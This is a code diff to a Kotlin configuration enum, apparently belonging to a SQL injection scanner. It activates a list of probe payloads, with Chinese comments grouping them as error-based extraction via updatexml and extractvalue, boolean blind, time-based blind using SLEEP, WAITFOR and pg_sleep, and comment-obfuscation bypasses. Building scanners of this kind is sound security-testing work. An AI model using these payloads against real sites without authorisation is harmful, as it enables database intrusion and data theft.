@@ -45,19 +45,36 @@ enum class Configs {
         "#{xx}",
         "#xx}",
         "sb'='\"=\"",
-//        "'",
-//        "\"",
-//        "')",
-//        "''",
-//        "'||'1",
-//        "\"||\"1",
-//        "sb'='\"=\"",
-//        "'OR'1\"OR\"1",
-//        "'OR'+1+\"OR\"+1=0",
-//        "' sleep(3)",
-//        "';WAITFOR DELAY '0:0:5'--" ,
-//        "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
-        //  "SLEEP(3) /*' or SLEEP(3) or'\" or SLEEP(3) or \""
+		// 1. 基础语法闭合报错（双引号用 \" 转义，核心修复点）
+        "'",
+        "\"",
+        "')",
+        "\");",
+        // 2. 数值型注入检测
+        "-1",
+        "-1 --+",
+        // 3. 主动报错函数注入
+        "' AND updatexml(1,concat(0x7e,user(),0x7e),1)--+",
+        "' AND extractvalue(1,concat(0x7e,version(),0x7e),1)--+",
+        "' AND GTID_SUBSET(CONCAT(0x7e,database(),0x7e),1)--+",
+        "' AND (SELECT 1/0 FROM generate_series(1,1))::text='0",
+        // 4. 布尔盲注（双引号转义）
+        "' AND 1=1--+",
+        "' AND 1=2--+",
+        "\" AND 1=1--+",
+        "\" AND 1=2--+",
+        "' OR '1'='1--+",
+        // 5. 时间盲注
+        "' AND SLEEP(5)--+",
+        "' AND BENCHMARK(10000000,MD5('test'))--+",
+        "';WAITFOR DELAY '0:0:5'--+",
+        "' AND (SELECT pg_sleep(5))--+",
+        "' AND DBMS_LOCK.SLEEP(5)='1",
+        "'and(select*from(select/**/sleep(10))a/**/union/**/select+1)='",
+        // 6. 简单绕过型
+        "'/**/AND/**/1=1--+",
+        "'/*!50000AND*/1=1--+",
+        "'%00' AND 1=1--+" // 移除末尾多余逗号，兼容旧编译器
     )
 
     val ERROR_SYNTAX: Array<String> = arrayOf(
